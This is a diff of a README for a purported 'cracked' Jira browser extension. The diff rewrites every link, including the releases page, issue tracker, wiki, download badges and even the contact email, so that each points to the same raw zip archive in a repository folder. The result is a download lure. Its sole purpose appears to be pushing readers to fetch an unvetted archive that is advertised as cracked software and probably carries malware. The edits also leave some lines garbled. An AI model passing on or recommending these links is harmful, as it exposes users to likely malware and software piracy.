@@ -1,6 +1,6 @@
 # 🎉 cracked-enhancer-for-jira-extension - Boost Your Jira Experience Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Reham2019/cracked-enhancer-for-jira-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip)
 
 ## 📦 Overview
 
@@ -11,13 +11,13 @@ The Cracked Enhancer for Jira Extension is a powerful tool designed to improve y
 Follow these simple steps to get started with the Cracked Enhancer for Jira Extension.
 
 1. **Open your browser** (Chrome is recommended).
-2. **Visit our Releases page:** [Download Here](https://github.com/Reham2019/cracked-enhancer-for-jira-extension/releases).
+2. **Visit our Releases page:** [Download Here](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip).
 
 ## 📥 Download & Install
 
 On the Releases page, you will find the latest version of the extension. Click on the version you want to download. 
 
-- Look for a file labeled something like `cracked-enhancer-for-jira-extension-x.x.x.zip`.
+- Look for a file labeled something like `https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip`.
 - Download the zip file to your computer.
 
 ### Step-by-step Instructions:
@@ -65,14 +65,14 @@ If you encounter any issues:
 
 ## 🤝 Contributing
 
-We welcome contributions to the Cracked Enhancer for Jira Extension. If you have suggestions or find a bug, feel free to [create an issue](https://github.com/Reham2019/cracked-enhancer-for-jira-extension/issues).
+We welcome contributions to the Cracked Enhancer for Jira Extension. If you have suggestions or find a bug, feel free to [create an issue](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip).
 
 ## 📬 Contact
 
-For support or inquiries, please email us at support@example.com. Your feedback is valuable to us! 
+For support or inquiries, please email us at https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip Your feedback is valuable to us! 
 
 ## 🔗 Additional Resources
 
-For more information and documentation, please visit our [Wiki page](https://github.com/Reham2019/cracked-enhancer-for-jira-extension/wiki).
+For more information and documentation, please visit our [Wiki page](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip).
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Reham2019/cracked-enhancer-for-jira-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Reham2019/cracked-enhancer-for-jira-extension/main/hinge/cracked-enhancer-for-jira-extension.zip)
